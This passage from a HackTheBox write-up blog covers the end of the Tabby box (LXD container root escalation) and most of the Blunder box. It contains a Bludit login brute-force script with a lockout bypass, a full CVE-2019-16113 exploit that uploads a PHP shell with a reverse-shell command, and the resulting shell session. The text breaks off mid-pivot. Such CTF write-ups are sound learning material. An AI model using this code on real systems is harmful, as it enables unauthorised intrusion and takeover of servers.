./build-alpine</span><br><span class="line">[sudo] password <span class="keyword">for</span> hg8:</span><br><span class="line">Determining the latest release... v3.12</span><br><span class="line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64</span><br><span class="line">Downloading alpine-mirrors-3.5.10-r0.apk</span><br><span class="line">Downloading alpine-keys-2.2-r0.apk</span><br><span class="line">Downloading apk-tools-static-2.10.5-r1.apk</span><br><span class="line">alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK</span><br><span class="line">Verified OK</span><br><span class="line">[...]</span><br><span class="line">OK: 8 MiB <span class="keyword">in</span> 19 packages</span><br><span class="line">[hg8@archpen ~]$ ls</span><br><span class="line">alpine-v3.12-x86_64-20200624_1903.tar.gz  build-alpine  LICENSE  README.md</span><br></pre></td></tr></table></figure><p>Alright now we upload our newly built image to the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archpen ~]$ scp -i id_rsa_htb alpine-v3.12-x86_64-20200624_1903.tar.gz ash@tabby.htb:/tmp/</span><br><span class="line">alpine-v3.12-x86_64-20200624_1903.tar.gz                          100% 3108KB 270.0KB/s   00:11</span><br></pre></td></tr></table></figure><p>We can import it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200624_1903.tar.gz --<span class="built_in">alias</span> hg8</span><br><span class="line">Image imported with fingerprint: 833677b049e4b3128c1b89887b818c555c735f4c112302386965f85a1e171fd1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc image list</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br><span class="line">| hg8   | 833677b049e4 | no     | alpine v3.12 (20200624_19:03) | x86_64       | CONTAINER | 3.04MB | Jun 24, 2020 at 5:22pm (UTC) |</span><br><span class="line">+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+</span><br></pre></td></tr></table></figure><p>Let’s now assign it security privileges and mount the full disk under <code>/mnt/root</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc init hg8 ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">ash@tabby:/tmp$ lxc config device add ignite hg8-device disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device hg8-device added to ignite</span><br><span class="line">ash@tabby:/tmp$ lxc start ignite</span><br></pre></td></tr></table></figure><p>Finally let’s get inside the container and navigate to <code>/mnt/root</code> see all the resources from our host machine.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ash@tabby:/tmp$ lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line"></span><br><span class="line">~ <span class="comment"># ls /mnt/root/</span></span><br><span class="line">bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var</span><br><span class="line">boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr</span><br><span class="line"></span><br><span class="line">~ <span class="comment"># cd /mnt/root/root/</span></span><br><span class="line">/mnt/root/root <span class="comment"># ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">/mnt/root/root <span class="comment"># cat root.txt</span></span><br><span class="line">0xxxxxxxxxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> LFI </tag>
            
            <tag> john </tag>
            
            <tag> tabby </tag>
            
            <tag> tomcat </tag>
            
            <tag> war </tag>
            
            <tag> zip </tag>
            
            <tag> lxc </tag>
            
            <tag> lxd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Blunder</title>
      <link href="/posts/blunder/"/>
      <url>/posts/blunder/</url>
      
        <content type="html"><![CDATA[<img width="581" alt="blunder hackthebox" src="https://user-images.githubusercontent.com/9076747/84426140-04a55b80-ac23-11ea-9013-d8e9d9f8c869.png"><p>Blunder just retired on Hackthebox, it’s an easy difficulty Linux box. This one got me a little frustrated at the beginning but in the end was quite fun and allowed me to play around with some useful tools and practice my Python coding skills. Good box if you like detective and guessing kind CTF ;)</p><p><strong>Tl;Dr:</strong> To get the user flag you first have to find a text file containing the website CMS admin username. Then you have to bruteforce the account password using a custom word list made from the website content. Once logged you can exploit a RCE vulnerability on the CMS to get a shell as <code>www-data</code>. There you find a file containing SHA-1 hashed password of <code>hugo</code> user. After cracking it you can use it to pivot to <code>hugo</code> user account and grab the flag.<br>To get the root flag you exploit a vulnerability in a specific configuration of <code>sudo</code> in order to escalate your privileges and read the flag. </p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.191 blunder.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC blunder.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 19:45 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> blunder.htb (10.10.10.191)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">21/tcp closed ftp</span><br><span class="line">80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Blunder</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Blunder | A blunder of interesting facts</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80. Port SSH 22 is closed, that’s unusual but let’s continue.</p><p>Opening <a href="http://blunder.htb/">http://blunder.htb</a> display a following page:</p><img width="1366" alt="blunder homepage" src="https://user-images.githubusercontent.com/9076747/84426529-acbb2480-ac23-11ea-9b90-4a2b29952efa.png"><p>The website seems quite basic, no images and the about page is practically empty and do not give any additional informations.</p><p>Checking the response header informs us that the website is running <code>Bludit</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl blunder.htb -I</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Date: Thu, 11 Jun 2020 18:42:56 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: Bludit</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>Checking online we found out about it:</p><blockquote><p>Bludit is a web application to build your own website or blog in seconds, it’s completely free and open source. Bludit uses files in JSON format to store the content, you don’t need to install or configure a database. You only need a web server with PHP support.</p><p><a href="https://www.bludit.com/">https://www.bludit.com</a></p></blockquote><p>Looking around Bludit Github page we stumble across an Remote Code Execution vulnerability: “<a href="https://github.com/bludit/bludit/issues/1081">Bludit v3.9.2 Code Execution Vulnerability in Upload function</a>“.<br>Looks pretty neat! Unfortunately this is an authenticated exploit… Let’s continue to dig.</p><p>Searching a bit more about Bludit we stumble across one <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">interesting article</a>:</p><blockquote><p><strong>Bludit Brute Force Mitigation Bypass</strong></p><p>Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to incorrectly login 10 times or more. Within the bl-kernel/security.class.php file, there is a function named getUserIp which attempts to determine the true IP address of the end user by trusting the X-Forwarded-For and Client-IP HTTP headers.</p><p>[…]</p><p>The reasoning behind the checking of these headers is to determine the IP address of end users who are accessing the website behind a proxy, however, trusting these headers allows an attacker to easily spoof the source address. Additionally, no validation is carried out to ensure they are valid IP addresses, meaning that an attacker can use any arbitrary value and not risk being locked out.</p></blockquote><p>Those two articles gives a good insight of the path to follow. We should be able to brute-force the admin account and from there exploit the remote code execution vulnerability. </p><h3 id="Brute-Force-Bludit-Admin-Account"><a href="#Brute-Force-Bludit-Admin-Account" class="headerlink" title="Brute Force Bludit Admin Account"></a>Brute Force Bludit Admin Account</h3><p>So our first step is to bruteforce our way to admin panel. According to Bludit documentation it can be found at <code>/admin</code> endpoint:</p><p><img src="https://user-images.githubusercontent.com/9076747/84428097-2fdd7a00-ac26-11ea-9e64-2617fd15544f.png"></p><p>The original researcher who found the brute-force mitigation bypass provided a simple proof-of-concept. Let’s use it and adapt it to our needs:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://10.10.10.191&#x27;</span></span><br><span class="line">login_url = host + <span class="string">&#x27;/admin&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rockyou.txt&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    rockyou = f.readlines()</span><br><span class="line"></span><br><span class="line">wordlist = [x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> rockyou]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    csrf_token = re.search(<span class="string">&#x27;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Trying: &#123;p&#125;&#x27;</span>.<span class="built_in">format</span>(p = password))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tokenCSRF&#x27;</span>: csrf_token,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;save&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;location&#x27;</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/admin/dashboard&#x27;</span> <span class="keyword">in</span> login_result.headers[<span class="string">&#x27;location&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;SUCCESS: Password found!&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Use &#123;u&#125;:&#123;p&#125; to login.&#x27;</span>.<span class="built_in">format</span>(u = username, p = password))</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>We run it and… bummer. No password found. </p><p>When this happen it’s always good to go back at the beginning to make sure we didn’t miss any information.</p><p>Usually we would run <code>gobuster</code> to see if we can come up with interesting files. Let’s give it a try now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://blunder.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php,txt,sql</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/0 (Status: 200)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/about (Status: 200)</span><br><span class="line">/admin (Status: 301)</span><br><span class="line">/cgi-bin/ (Status: 301)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/todo.txt (Status: 200)</span><br></pre></td></tr></table></figure><p>That <code>todo.txt</code> looks interesting:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl blunder.htb/todo.txt</span><br><span class="line">-Update the CMS</span><br><span class="line">-Turn off FTP - DONE</span><br><span class="line">-Remove old users - DONE</span><br><span class="line">-Inform fergus that the new blog needs images - PENDING</span><br></pre></td></tr></table></figure><p>“Inform fergus that the new blog needs images”. Looks like <code>fergus</code> is very probably the admin of the blog. Let’s update our script and use <code>fergus</code> as username this time. </p><p>…and no results again. What could it be now ? Maybe <code>fergus</code> password is not in the old <code>rockyou.txt</code> wordlist?  This is where a bit of guesswork happens.</p><p>The Blunder website is having quite a lot of vocabulary, especially the Stephen King article which have a lot of names that could make a password.<br>Let’s try to extract long strings from the website and test them as password.</p><p>To do so we could create a Python script using BeautifulSoup. But there is a tool that can do the job perfectly called <a href="https://digi.ninja/projects/cewl.php"><code>cewl</code></a>. This tool will allows us to create a wordlist from the website content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ruby cewl.rb <span class="string">&quot;http://10.10.10.191/&quot;</span> -m 7 -w blunder.txt</span><br><span class="line">[hg8@archbook ~]$ cat blunder.txt</span><br><span class="line">interesting</span><br><span class="line">Reading</span><br><span class="line">Fantasy</span><br><span class="line">National</span><br><span class="line">description</span><br><span class="line">Stephen</span><br><span class="line">nothing</span><br><span class="line">byEgotisticalSW</span><br><span class="line">American</span><br><span class="line">literature</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Now let’s edit our script to use our newly made wordlist and run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python bludit-bruteforce-bypass.py</span><br><span class="line">[*] Trying: Plugins</span><br><span class="line">[...]</span><br><span class="line">[*] Trying: fictional</span><br><span class="line">[*] Trying: character</span><br><span class="line">[*] Trying: RolandDeschain</span><br></pre></td></tr></table></figure><p>Bingo! We got the credentials as <code>fergus:RolandDeschain</code>.</p><h3 id="Remote-Code-Execution-via-Upload-Function"><a href="#Remote-Code-Execution-via-Upload-Function" class="headerlink" title="Remote Code Execution via Upload Function"></a>Remote Code Execution via Upload Function</h3><p>Once logged in as <code>fergus</code> we access the Bludit main dashboard:</p><p><img src="https://user-images.githubusercontent.com/9076747/85209918-1336f580-b33c-11ea-8343-972c8827eeb1.png" alt="bludit admin dashboard"></p><p>Now that we are authenticated we can take a deeper look at the vulnerability we found earlier: <a href="https://github.com/bludit/bludit/issues/1081">Bludit v3.9.2 Code Execution Vulnerability via Upload function</a>.<br>We indeed have proper access to the upload function:</p><p><img src="https://user-images.githubusercontent.com/9076747/85209957-7163d880-b33c-11ea-9cf4-00eb906e8fc2.png" alt="bludit upload function"></p><p>We now have everything need in order to exploit the vulnerability. There is even a <a href="https://www.exploit-db.com/exploits/47699">Metasploit module</a> available for it.</p><p>Using Metasploit is cool and all but doesn’t help to understand what’s really going on and <em>how</em> the vulnerability is working. So I decided to write <a href="https://github.com/hg8/CVE-2019-16113-PoC">my own script</a> in order to better understand the problem and train my Python skills.</p><p>I ended up with the following PoC:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># PoC by @hg8</span></span><br><span class="line"><span class="comment"># Credit: @christasa</span></span><br><span class="line"><span class="comment"># https://github.com/bludit/bludit/issues/1081</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bludit-example.com&quot;</span></span><br><span class="line">user = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;admin&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_login</span>():</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    login_page = s.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/&quot;</span>)</span><br><span class="line">    csrf_token = re.search(<span class="string">&#x27;&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: user,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">        <span class="string">&quot;tokenCSRF&quot;</span>: csrf_token</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/&quot;</span>, data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">301</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Username or password incorrect.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Loggin successful.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csrf</span>(<span class="params">s</span>):</span></span><br><span class="line">    r = s.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/&quot;</span>)</span><br><span class="line">    csrf_token = r.text.split(<span class="string">&#x27;var tokenCSRF = &quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Token CSRF: <span class="subst">&#123;csrf_token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> csrf_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_shell</span>(<span class="params">s, csrf_token</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;uuid&quot;</span>: <span class="string">&quot;../../tmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenCSRF&quot;</span>: csrf_token</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    multipart = [(<span class="string">&#x27;images[]&#x27;</span>, (<span class="string">&quot;blut.png&quot;</span>, <span class="string">&quot;&lt;?php shell_exec(\&quot;rm .htaccess;rm blut.png;&quot;</span> + cmd + <span class="string">&quot;\&quot;);?&gt;&quot;</span>, <span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line"></span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/ajax/upload-images&quot;</span>, data, files=multipart)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Error uploading Shell.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Make sure Bludit version &gt;= 3.9.2.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Shell upload succesful.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    multipart_htaccess = [(<span class="string">&#x27;images[]&#x27;</span>, (<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&quot;RewriteEngine off\r\nAddType application/x-httpd-php .png&quot;</span>, <span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">    r = s.post(url + <span class="string">&quot;/admin/ajax/upload-images&quot;</span>, data, files=multipart_htaccess)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Error uploading .htaccess.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Make sure Bludit version &gt;= 3.9.2.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] .htaccess upload succesful.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_cmd</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/bl-content/tmp/blut.png&quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command Execution Successful.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = admin_login()</span><br><span class="line">    csrf_token = get_csrf(session)</span><br><span class="line">    upload_shell(session, csrf_token)</span><br><span class="line">    execute_cmd(session)</span><br></pre></td></tr></table></figure><p>Let’s use it to open a reverse shell.</p><p>First we open our <code>nc</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Then execute our Remote Code Execution exploit:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python CVE-2019-16113.py </span><br><span class="line">[+] Loggin successful.</span><br><span class="line">[+] Token CSRF: 20beeffb850557dccc6e3e67a3207f822c1fdbad</span><br><span class="line">[+] Shell upload succesful.</span><br><span class="line">[+] .htaccess upload succesful.</span><br><span class="line">[+] Command Execution successful.</span><br></pre></td></tr></table></figure><p>And a new connection appear on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.191:48860</span><br><span class="line">www-data@blunder:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>We now have a shell as <code>www-data</code>.</p><h3 id="Pivot-www-data-gt-hugo"><a href="#Pivot-www-data-gt-hugo" class="headerlink" title="Pivot www-data -&gt; hugo"></a>Pivot www-data -&gt; hugo</h3><p>Looking at the <code>/home/</code> folder we can see that <code>Hugo</code> hold the user flag. We need to find a way to pivot to his account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/$ ls -l /home/</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 16 hugo  hugo  4096 May 26 09:29 hugo</span><br><span 